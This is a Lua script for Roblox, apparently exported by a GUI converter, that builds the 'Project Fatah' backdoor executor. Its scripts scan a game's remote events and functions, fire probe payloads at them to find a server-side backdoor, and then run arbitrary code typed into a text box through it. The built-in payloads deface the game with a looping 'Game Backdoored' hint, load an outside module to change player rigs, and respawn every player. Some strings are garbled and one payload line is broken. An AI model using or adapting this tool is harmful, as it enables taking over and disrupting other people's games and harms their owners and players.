-- Instances: 25 | Scripts: 4 | Modules: 0 | Tags: 0
local G2L = {};

-- StarterGui.ScreenGui
G2L["1"] = Instance.new("ScreenGui", game.CoreGui);
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;


-- StarterGui.ScreenGui.Executor
G2L["2"] = Instance.new("Frame", G2L["1"]);
G2L["2"]["BorderSizePixel"] = 2;
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2"]["Size"] = UDim2.new(0, 643, 0, 380);
G2L["2"]["Position"] = UDim2.new(0.10951, 0, 0.2367, 0);
G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2"]["Name"] = [[Executor]];


-- StarterGui.ScreenGui.Executor.LocalScript
G2L["3"] = Instance.new("LocalScript", G2L["2"]);



-- StarterGui.ScreenGui.Executor.UIDrag
G2L["4"] = Instance.new("LocalScript", G2L["2"]);
G2L["4"]["Name"] = [[UIDrag]];


-- StarterGui.ScreenGui.Executor.Codebar
G2L["5"] = Instance.new("TextBox", G2L["2"]);
G2L["5"]["Name"] = [[Codebar]];
G2L["5"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["5"]["BorderSizePixel"] = 2;
G2L["5"]["TextWrapped"] = true;
G2L["5"]["TextSize"] = 23;
G2L["5"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["5"]["BackgroundColor3"] = Color3.fromRGB(245, 245, 245);
G2L["5"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["5"]["MultiLine"] = true;
G2L["5"]["ClearTextOnFocus"] = false;
G2L["5"]["PlaceholderText"] = [[print("Backdoor")]];
G2L["5"]["Size"] = UDim2.new(0, 461, 0, 306);
G2L["5"]["Position"] = UDim2.new(0.03244, 0, 0.13773, 0);
G2L["5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5"]["Text"] = [[]];


-- StarterGui.ScreenGui.Executor.Btn
G2L["6"] = Instance.new("Frame", G2L["2"]);
G2L["6"]["BorderSizePixel"] = 0;
G2L["6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6"]["Size"] = UDim2.new(0, 123, 0, 303);
G2L["6"]["Position"] = UDim2.new(0.77258, 0, 0.14296, 0);
G2L["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6"]["Name"] = [[Btn]];


-- StarterGui.ScreenGui.Executor.Btn.UIListLayout
G2L["7"] = Instance.new("UIListLayout", G2L["6"]);
G2L["7"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["7"]["VerticalAlignment"] = Enum.VerticalAlignment.Center;
G2L["7"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.ScreenGui.Executor.Btn.Exe
G2L["8"] = Instance.new("TextButton", G2L["6"]);
G2L["8"]["BorderSizePixel"] = 2;
G2L["8"]["TextSize"] = 23;
G2L["8"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["8"]["Size"] = UDim2.new(0, 122, 0, 103);
G2L["8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8"]["Text"] = [[Execute]];
G2L["8"]["Name"] = [[Exe]];
G2L["8"]["Position"] = UDim2.new(0.00407, 0, -0.00655, 0);


-- StarterGui.ScreenGui.Executor.Btn.Clr
G2L["9"] = Instance.new("TextButton", G2L["6"]);
G2L["9"]["BorderSizePixel"] = 2;
G2L["9"]["TextSize"] = 23;
G2L["9"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["9"]["Size"] = UDim2.new(0, 122, 0, 101);
G2L["9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9"]["Text"] = [[Clear]];
G2L["9"]["Name"] = [[Clr]];
G2L["9"]["Position"] = UDim2.new(0.00407, 0, 0.33428, 0);


-- StarterGui.ScreenGui.Executor.Btn.Inj
G2L["a"] = Instance.new("TextButton", G2L["6"]);
G2L["a"]["BorderSizePixel"] = 2;
G2L["a"]["TextSize"] = 23;
G2L["a"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a"]["Size"] = UDim2.new(0, 122, 0, 103);
G2L["a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a"]["Text"] = [[Inject]];
G2L["a"]["Name"] = [[Inj]];
G2L["a"]["Position"] = UDim2.new(0.00407, 0, 0.66855, 0);


-- StarterGui.ScreenGui.Executor.Status
G2L["b"] = Instance.new("TextLabel", G2L["2"]);
G2L["b"]["TextWrapped"] = true;
G2L["b"]["BorderSizePixel"] = 0;
G2L["b"]["TextSize"] = 26;
G2L["b"]["TextScaled"] = true;
G2L["b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b"]["BackgroundTransparency"] = 1;
G2L["b"]["Size"] = UDim2.new(-0.00957, 31, -0.00268, 29);
G2L["b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b"]["Text"] = [[Ã°ÂŸÂ”Â´]];
G2L["b"]["Name"] = [[Status]];
G2L["b"]["Position"] = UDim2.new(0.93996, 0, 0.03269, 0);


-- StarterGui.ScreenGui.Executor.Status.UIAspectRatioConstraint
G2L["c"] = Instance.new("UIAspectRatioConstraint", G2L["b"]);



-- StarterGui.ScreenGui.Executor.ImageLabel
G2L["d"] = Instance.new("ImageLabel", G2L["2"]);
G2L["d"]["BorderSizePixel"] = 0;
G2L["d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["d"]["Image"] = [[rbxassetid://129021758100934]];
G2L["d"]["Size"] = UDim2.new(0.00028, 31, 0.01696, 28);
G2L["d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d"]["BackgroundTransparency"] = 1;
G2L["d"]["Position"] = UDim2.new(0.02163, 0, 0.02849, 0);


-- StarterGui.ScreenGui.Executor.ImageLabel.UIAspectRatioConstraint
G2L["e"] = Instance.new("UIAspectRatioConstraint", G2L["d"]);



-- StarterGui.ScreenGui.Executor.R6
G2L["f"] = Instance.new("TextButton", G2L["2"]);
G2L["f"]["BorderSizePixel"] = 2;
G2L["f"]["TextSize"] = 23;
G2L["f"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["f"]["Size"] = UDim2.new(0, 108, 0, 30);
G2L["f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f"]["Text"] = [[R6]];
G2L["f"]["Name"] = [[R6]];
G2L["f"]["Position"] = UDim2.new(0.75305, 0, 0.02849, 0);


-- StarterGui.ScreenGui.Executor.R6.LocalScript
G2L["10"] = Instance.new("LocalScript", G2L["f"]);



-- StarterGui.ScreenGui.Executor.RE
G2L["11"] = Instance.new("TextButton", G2L["2"]);
G2L["11"]["BorderSizePixel"] = 2;
G2L["11"]["TextSize"] = 23;
G2L["11"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["11"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["11"]["Size"] = UDim2.new(0, 108, 0, 30);
G2L["11"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11"]["Text"] = [[RE]];
G2L["11"]["Name"] = [[RE]];
G2L["11"]["Position"] = UDim2.new(0.56305, 0, 0.02849, 0);


-- StarterGui.ScreenGui.Executor.RE.LocalScript
G2L["12"] = Instance.new("LocalScript", G2L["11"]);



-- StarterGui.ScreenGui.Executor.TextLabel
G2L["13"] = Instance.new("TextLabel", G2L["2"]);
G2L["13"]["BorderSizePixel"] = 0;
G2L["13"]["TextSize"] = 26;
G2L["13"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["13"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["13"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["13"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13"]["BackgroundTransparency"] = 1;
G2L["13"]["Size"] = UDim2.new(0, 231, 0, 51);
G2L["13"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13"]["Text"] = [[Project Fatah]];
G2L["13"]["Position"] = UDim2.new(0.09235, 0, 0.00262, 0);


-- StarterGui.ScreenGui.Logo
G2L["14"] = Instance.new("Frame", G2L["1"]);
G2L["14"]["Visible"] = false;
G2L["14"]["BorderSizePixel"] = 0;
G2L["14"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["14"]["Size"] = UDim2.new(0.99019, 0, 0.97834, 0);
G2L["14"]["Position"] = UDim2.new(0.00981, 0, 0, 0);
G2L["14"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14"]["Name"] = [[Logo]];
G2L["14"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Logo.ImageLabel
G2L["15"] = Instance.new("ImageLabel", G2L["14"]);
G2L["15"]["BorderSizePixel"] = 0;
G2L["15"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["15"]["Image"] = [[rbxassetid://129021758100934]];
G2L["15"]["Size"] = UDim2.new(0.03991, 31, 0.07485, 28);
G2L["15"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["15"]["BackgroundTransparency"] = 1;
G2L["15"]["Position"] = UDim2.new(0, 0, 0.88087, 0);


-- StarterGui.ScreenGui.Logo.ImageLabel.UIAspectRatioConstraint
G2L["16"] = Instance.new("UIAspectRatioConstraint", G2L["15"]);



-- StarterGui.ScreenGui.Logo.ImageLabel.TextLabel
G2L["17"] = Instance.new("TextLabel", G2L["15"]);
G2L["17"]["TextWrapped"] = true;
G2L["17"]["BorderSizePixel"] = 0;
G2L["17"]["TextSize"] = 26;
G2L["17"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["17"]["TextScaled"] = true;
G2L["17"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["17"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["17"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["17"]["BackgroundTransparency"] = 1;
G2L["17"]["Size"] = UDim2.new(0, 142, 0, 51);
G2L["17"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["17"]["Text"] = [[Project Fatah Injected also add Fatahhax on dizzy]];
G2L["17"]["Position"] = UDim2.new(1.12769, 0, 0.14863, 0);


-- StarterGui.ScreenGui.Logo.ImageLabel.TextLabel.UIStroke
G2L["18"] = Instance.new("UIStroke", G2L["17"]);



-- StarterGui.ScreenGui.Logo.UIListLayout
G2L["19"] = Instance.new("UIListLayout", G2L["14"]);
G2L["19"]["VerticalAlignment"] = Enum.VerticalAlignment.Bottom;
G2L["19"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.ScreenGui.Executor.LocalScript
local function C_3()
local script = G2L["3"];
	local buttons = {
		Exe = script.Parent.Btn.Exe;
		clear = script.Parent.Btn.Clr;
		connect = script.Parent.Btn.Inj;
	}
	
	local statustext = script.Parent.Status
	local codeBar = script.Parent.Codebar
	local logo = script.Parent.Parent.Logo
	
	local statusIcons = {
		Offline = "Ã°ÂŸÂ”Â´";
		Checking = "Ã°ÂŸÂŸÂ ";
		Allow = "Ã°ÂŸÂŸÂ¢";
	}
	
	local function setStatus(key)
		if key == "O" then
			statustext.Text = statusIcons.Offline
		elseif key == "C" then
			statustext.Text = statusIcons.Checking
		elseif key == "B" then
			statustext.Text = statusIcons.Allow
		end
	end
	
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}
	
	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}
	
	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0 
	
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")
	
	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end
	
		if EXCLUDED_REMOTES[remote.Name] then return false end
	
		return true
	end
	
	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()
	
	local function testRemote(remote, isFunction)
	
		if foundExploit then return false end
	
	
		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)
	
		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}
	
	
	
		local RE = [[
		local m = Instance.new("Message", gamegame.sspacepam.Text = "project Fatah injected!!"
		wait(4)
		m:Destroy()
		]]
	
	
	
	
	
	
	
	
		local Hint = [[
		local hint = Instance.new("Hint", game.Workspace)
		hint.Text = "Game Backdoored by Project Fatah Haxx (Fatahxxx)"
		
		while true do
			wait(5)
			hint:Destroy()
			wait(5)
			local hint = Instance.new("Hint", game.Workspace)
			hint.Text = "Game Backdoored by Fatah Haxx (Fatah)"
		end
		]]
	
	
	
	
	
		pcall(function()
			if isFunction then
				task.spawn(function() 
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(RE) end)
					pcall(function() remote:InvokeServer(Hint) end) --- its hint dumbass
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(RE) end)
				pcall(function() remote:FireServer(Hint) end) --- its hint dumbass
			end
		end)
	
		return testId
	end
	
	local function simpleFindRemote()
		setStatus("C")
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0 
		local candidates = {}
		local initialScanStart = os.clock()
	
		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("Ã°ÂŸÂ”Â Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))
	
		local testStartTime = os.clock() 
		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end
	
			local timeoutDuration = 0.5
			local checkInterval = 1
			local elapsed = 0
	
			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval
	
				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]
	
					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end
	
		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("no backdoor found")
		else
			print("Backdoor remote located!")
		end
	
		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	
	local exeConnection
	local function updateExeButton()
		if exeConnection then
			exeConnection:Disconnect()
			exeConnection = nil
		end
		if foundExploit then
			exeConnection = buttons.Exe.MouseButton1Click:Connect(function()
				local code = codeBar.Text
				if code and code ~= "" then
					if remoteEvent then
						pcall(function() remoteEvent:FireServer(code) end)
					elseif remoteFunction then
						pcall(function()
							remoteFunction:InvokeServer("moonTSS", code)
						end)
					end
					StarterGui:SetCore("SendNotification", {
						Title = "Project Astr0",
						Text = "Code executed through backdoor",
						Icon = "rbxassetid://120603069061092",
						Duration = 3,
					})
				else
					StarterGui:SetCore("SendNotification", {
						Title = "Project Astr0",
						Text = "No Code to Execute",
						Icon = "rbxassetid://120603069061092",
						Duration = 3,
					})
				end
			end)
		else
			exeConnection = buttons.Exe.MouseButton1Click:Connect(function()
				StarterGui:SetCore("SendNotification", {
					Title = "Project Astr0",
					Text = "No Backdoor Found",
					Icon = "rbxassetid://120603069061092",
					Duration = 5,
				})
			end)
		end
	end
	
	buttons.connect.MouseButton1Click:Connect(function()
		setStatus("C")
		StarterGui:SetCore("SendNotification", {
			Title = "Project Astr0",
			Text = "Checking for backdoors...",
			Icon = "rbxassetid://120603069061092",
			Duration = 3,
		})
		task.spawn(function()
			local scanStart = os.clock() 
			simpleFindRemote()
			local scanEnd = os.clock()
			print(string.format("Ã°ÂŸÂŒÂ™ moon: Scan completed in %.2f ms", (scanEnd - scanStart) * 1000))
	
			if foundExploit then
				setStatus("B")
				local formattedTime = string.format("%.2f", timeToFindExploit)
				StarterGui:SetCore("SendNotification", {
					Title = "Project Astr0",
					Text = "Backdoor found in " .. formattedTime .. " seconds!",
					Icon = "rbxassetid://120603069061092",
					Duration = 5,
				})
				logo.Visible = true
			else
				setStatus("O")
				StarterGui:SetCore("SendNotification", {
					Title = "Project Astr0",
					Text = "No backdoor found",
					Icon = "rbxassetid://120603069061092",
					Duration = 5,
				})
			end
			updateExeButton()
		end)
	end)
	
	buttons.clear.MouseButton1Click:Connect(function()
		codeBar.Text = ""
	end)
	
	setStatus("O")
	updateExeButton()
end;
task.spawn(C_3);
-- StarterGui.ScreenGui.Executor.UIDrag
local function C_4()
local script = G2L["4"];
	-- Made by Real_IceyDev (@lceyDex) --
	-- Simple UI dragger (PC Only/Any device that has a mouse) --
	
	local UIS = game:GetService('UserInputService')
	local frame = script.Parent
	local dragToggle = nil
	local dragSpeed = 0.25
	local dragStart = nil
	local startPos = nil
	
	local function updateInput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end
	
	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)
	
	UIS.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updateInput(input)
			end
		end
	end)
end;
task.spawn(C_4);
-- StarterGui.ScreenGui.Executor.R6.LocalScript
local function C_10()
local script = G2L["10"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}
	
	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}
	
	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0
	
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")
	
	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end
	
		if EXCLUDED_REMOTES[remote.Name] then return false end
	
		return true
	end
	
	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()
	
	local function testRemote(remote, isFunction)
	
		if foundExploit then return false end
	
		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)
	
		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}
	
		local player = game.Players.LocalPlayer
		local payloading = [[require(3436957371):r6(']] .. player.Name .. [[')]]
		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)
	
	
		return testId
	end
	
	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0
	
		local candidates = {}
		local initialScanStart = os.clock()
	
		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("Ã°ÂŸÂŒÂ™ moon: Ã°ÂŸÂ”Â Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))
	
		local testStartTime = os.clock()
	
		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end
	
			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0
	
			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval
	
				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]
	
					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("Ã°ÂŸÂŒÂ™ moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end
	
		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("Ã°ÂŸÂŒÂ™ moon: no backdoor found")
		else
			print("Ã°ÂŸÂ”Â“ Backdoor remote located!")
		end
	
		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else
	
		print("Ã°ÂŸÂŒÂ™ moon: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_10);
-- StarterGui.ScreenGui.Executor.RE.LocalScript
local function C_12()
local script = G2L["12"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}
	
	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}
	
	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0
	
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")
	
	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end
	
		if EXCLUDED_REMOTES[remote.Name] then return false end
	
		return true
	end
	
	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()
	
	local function testRemote(remote, isFunction)
	
		if foundExploit then return false end
	
		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)
	
		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}
	
	
		local player = game.Players.LocalPlayer
		local payloading = [[
		for _, lol in pairs(game.Players:GetPlayers()) do
		lol:LoadCharacter()
	    end
		]]
		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)
	
	
		return testId
	end
	
	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0
	
		local candidates = {}
		local initialScanStart = os.clock()
	
		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("Ã°ÂŸÂŒÂ™ moon: Ã°ÂŸÂ”Â Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))
	
		local testStartTime = os.clock()
	
		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end
	
			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0
	
			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval
	
				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]
	
					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("Ã°ÂŸÂŒÂ™ moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end
	
		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("Ã°ÂŸÂŒÂ™ moon: no backdoor found")
		else
			print("Ã°ÂŸÂ”Â“ Backdoor remote located!")
		end
	
		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else
	
		print("Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_12);

return G2L["1"], require;
